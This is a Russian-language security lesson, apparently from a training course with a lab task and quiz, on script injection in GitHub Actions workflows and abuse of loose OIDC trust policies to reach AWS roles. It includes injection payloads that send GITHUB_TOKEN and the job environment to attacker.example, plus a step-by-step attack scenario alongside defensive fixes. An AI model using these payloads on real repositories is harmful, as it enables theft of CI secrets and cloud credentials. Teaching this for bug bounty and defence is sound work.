---
id: cloud-cicd-github-actions
title: "GitHub Actions: инъекции в workflow и OIDC-доверие к облаку"
category: cloud
parent: cloud-cicd-secrets
difficulty: hard
order: 2
tags: [cloud, github-actions, workflow, injection, oidc, secrets, ci]
prerequisites: [cloud-cicd-secrets]
useful_for:
  - "Атака на GitHub Actions для получения облачных кредов"
  - "Понимание workflow injection"
  - "Bug bounty: CI/CD в публичных репозиториях"
estimated_minutes: 40
summary: "Как эксплуатировать GitHub Actions: script injection в workflow, pull_request_target, OIDC-доверие к AWS/GCP/Azure, утечка GITHUB_TOKEN и секретов. Практические пейлоады."
lab:
  kind: shell
  title: "Практика: инъекция в GitHub Actions workflow"
  toolset: [core]
  workdir: /home/student/ghainject
  files: [task.md, notes.md, workflow.yml, run-log.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`workflow.yml` подставляет контекст события прямо в `run:` — это инъекция."
    - "`${{ github.event.issue.title }}` контролируется атакующим."
    - "Найди флаг: `grep nto run-log.txt > found.txt`."

---
## Задача

Мы уже знаем, что CI — доверенный исполнитель с секретами (`cloud-cicd-secrets`). Теперь разберём **конкретный** способ заставить его выполнить наш код: **инъекцию в workflow**. GitHub Actions позволяет подставлять текст из событий (issue, PR, комментарий) в shell-команды. Если это делается небезопасно — текст становится командой. Разберём на реальном workflow.

## Данные: workflow с интерполяцией

Смотрим файл `.github/workflows/issue-bot.yml`:

```yaml
on:
  issues:
    types: [opened]
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"
```

Строка `${{ github.event.issue.title }}` — это **интерполяция**: значение подставляется в текст до запуска. Проблема в том, что GitHub подставляет его **в саму команду оболочки**, а не как переменную окружения.

## Пробуем в лоб: почему это не «просто текст»

Если написать `echo "$TITLE"`, оболочка воспримет значение как данные. Но здесь значение вклеивается прямо в строку скрипта. Значит, специальные символы оболочки (`;`, `|`, `` ` ``, `$()`) в заголовке issue исполнятся. Открываем issue с заголовком:

```
a"; curl -s https://attacker.example/?t=$(cat $GITHUB_TOKEN); echo "
```

Workflow запускается, и команда `curl` выполняется на раннере. Это **script injection** — превращение данных в код.

## Приём: что даёт инъекция на раннере

Раннер — полноценный хост. Через инъекцию мы исполняем любую команду в контексте job'а. Дальше:

- читаем окружение: `env`;
- читаем файлы кредов: `~/.aws/credentials`, `~/.docker/config.json`;
- читаем **`GITHUB_TOKEN`** — токен, автоматически выданный job'у.

Смотрим, что за токен:

```
$ curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user
{ "login": "acme-bot", "type": "Bot" }
$ curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/acme/webapp
{ "permissions": { "push": true, "admin": false } }
```

Если у токена есть `push` или `admin` на репозиторий — можно коммитить в доверенный репозиторий, а это уже путь к пайплайну деплоя.

## Полный прогон: от issue до облака

1. **Находим интерполяцию.** `grep -n '\${{' .github/workflows/*.yml` — ищем события, которые контролирует атакующий.
2. **Готовим payload.** Заголовок issue с командой (`$(...)`).
3. **Создаём issue.** Workflow запускается, команда исполняется.
4. **Собираем GITHUB_TOKEN и env.**
5. **Идём к облаку.** Если workflow имеет `id-token: write`, он может получить облачную роль через OIDC:

```yaml
permissions:
  id-token: write
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
      aws-region: us-east-1
```

Тогда в окружении job'а появятся временные AWS-креды, и инъекция их прочитает.

## OIDC-доверие к облаку

**OIDC** (OpenID Connect) — механизм, при котором CI предъявляет подписанный токен, а облако выдаёт временную роль без статических ключей. Роль доверяет GitHub через **trust policy**:

```
$ aws iam get-role --role-name ci-deploy --query 'Role.AssumeRolePolicyDocument'
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": { "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*" } }
  }]
}
```

Условие `repo:acme/*` — со звёздочкой. Любой репозиторий организации `acme` (или специально созданный `acme-evil`) может принять эту роль. Правильное условие — конкретный репозиторий и ветка: `repo:acme/webapp:ref:refs/heads/main`.

## Другие события, которые контролирует атакующий

Инъекция возможна всюду, где текст события попадает в `run`. Перечислим опасные поля:

- `github.event.issue.title` / `.body` — заголовок и текст issue.
- `github.event.pull_request.title` / `.body` / `.head.ref` — имя ветки из PR.
- `github.event.comment.body` — комментарий.
- `github.event.discussion.title` — заголовок обсуждения.
- `github.head_ref` — имя ветки; его легко задать при форке.

Особенно коварно `github.head_ref`: имя ветки в форке атакующего — полностью подконтрольная строка. Пример payload в имени ветки:

```
$ git checkout -b 'x";curl -s https://attacker.example/$(env|base64);#'
```

При таком `run: echo "${{ github.head_ref }}"` команда исполнится. Правило простое: **данные события — никогда в `run` напрямую**, только через `env:` и с кавычками.

## Защита и что ломает атаку

- **Не интерполировать данные в `run`.** Передавайте через `env:` и используйте `"$VAR"`:

```yaml
- run: echo "New issue: $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

- **Ограничить `permissions`.** `permissions: contents: read` вместо `write-all`.
- **Узкая OIDC trust policy** — без звёздочек, с `ref` и `environment`.
- **Required reviewers** на environment с секретами.
- **`pull_request` вместо `pull_request_target`** там, где не нужны секреты.

## Если не сработало

- **Данные идут через `env:`** — инъекции нет.
- **`permissions: read-all`** — `GITHUB_TOKEN` не даёт писать.
- **OIDC с точным `sub`** — роль из чужого репозитория не принять.
- **Секреты за environment с approval** — job ждёт человека.
- **Сам хостинг раннера изолирован** — меньше данных на диске, но env всё равно читается.

## Мини-сценарий: issue с payload

1. **Разведка.** `grep -n '\${{' .github/workflows/*.yml` → в `issue-bot.yml` строка `run: echo "New issue: ${{ github.event.issue.title }}"`.
2. **Payload.** Открываем issue с заголовком: `a"; curl -s https://attacker.example/?t=$(env|base64); echo "`.
3. **Срабатывание.** Workflow запускается, значение вклеивается в команду, `curl` исполняется на раннере.
4. **Сбор.** Env job'а уходит к нам — включая `GITHUB_TOKEN` и, если есть `id-token: write`, OIDC-токен.
5. **Использование токена.** `curl -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user` → бот с правами.
6. **Облако.** Если workflow имеет `id-token: write` — обмениваем OIDC-токен на роль `ci-deploy`.
7. **Проверка.** `aws sts get-caller-identity` → роль принята.

Один заголовок issue — и мы на раннере с токенами.

## Что мы теперь знаем

1. Интерполяция `${{ }}` в `run` = script injection.
2. Инъекция даёт RCE на раннере с `GITHUB_TOKEN` и env.
3. `GITHUB_TOKEN` с `push` открывает запись в репозиторий.
4. `id-token: write` позволяет принять облачную роль через OIDC.
5. Защита — `env:`, узкие `permissions`, точная trust policy.
6. Любое поле события, попадающее в `run`, — потенциальная команда.

Вывод короткий: workflow — это программа, а события — её вход. Обращайтесь с входом как с недоверенным.

## Частые ошибки

- **Интерполяция полей события в `run`** — script injection.
- **`permissions: write-all`** — токен может писать куда угодно.
- **`pull_request_target` + checkout кода PR.**
- **OIDC `sub` со звёздочкой** — роль примет чужой репозиторий.
- **Нет required reviewers** на environment с секретами.

## На что смотреть дальше

- `grep '\${{' .github/workflows/*.yml` — какие события контролирует атакующий.
- `permissions:` в workflow.
- `pull_request_target` + checkout кода PR.
- `id-token: write` и trust policy облачной роли.
- Секреты за environment без required reviewers.

## Быстрая проверка

Три команды отделяют уязвимый workflow от безопасного:

```bash
grep -rn '\${{' .github/workflows/*.yml     # интерполяции в run
grep -rn 'pull_request_target' .github/workflows/*.yml
grep -rn 'id-token: write' .github/workflows/*.yml
```

Нашли интерполяцию события в `run` — это потенциальная инъекция. Нашли `pull_request_target` с checkout кода PR — потенциальная кража секретов.

## Квиз

Проверь себя.

```quiz
- question: "Почему интерполяция ${{ github.event.issue.title }} в run опасна?"
  options:
    - "Значение вклеивается в shell-команду и может исполниться как код"
    - "Она замедляет workflow"
    - "Она шифрует логи"
    - "Она удаляет issue"
  answer: 0
  explanation: "Данные становятся частью команды — это script injection."
- question: "Как безопасно передать данные из события в run?"
  options:
    - "Через env: и обращение '$VAR'"
    - "Через прямой ${{ }} в run"
    - "Через echo без кавычек"
    - "Через eval"
  answer: 0
  explanation: "env + кавычки не дают данным исполниться."
- question: "Какой токен автоматически доступен в GitHub Actions?"
  options:
    - "GITHUB_TOKEN"
    - "AWS_SESSION_TOKEN"
    - "CI_JOB_TOKEN"
    - "NPM_TOKEN"
  answer: 0
  explanation: "GITHUB_TOKEN создаётся на каждый запуск."
- question: "Что позволяет permissions: id-token: write?"
  options:
    - "Получить облачную роль через OIDC"
    - "Писать в репозиторий"
    - "Удалять секреты"
    - "Отключать Actions"
  answer: 0
  explanation: "id-token нужен для OIDC-федерации."
- question: "Какая OIDC trust policy безопасна?"
  options:
    - "repo:acme/webapp:ref:refs/heads/main"
    - "repo:acme/*"
    - "любой репозиторий"
    - "пустое условие"
  answer: 0
  explanation: "Конкретный репозиторий и ветка, без звёздочек."
```

## Куда дальше

В следующем уроке (`cloud-cicd-jenkins`) мы посмотрим на классические CI-серверы — Jenkins и GitLab — где RCE даёт прямой доступ к хранилищу кредов. А пока главное: любой текст, попадающий в `run`, — это потенциальная команда.

## Где пригодится

- **Bug bounty:** workflow injection в публичных репозиториях.
- **Red team:** от CI к облачным кредам через OIDC.
- **Пентест:** аудит GitHub Actions.
- **Работа/DevSecOps:** `env:`, узкие permissions, точный OIDC `sub`.
- **Дальше по дереву:** `cloud-cicd-jenkins`, `cloud-github-actions-pwn`.
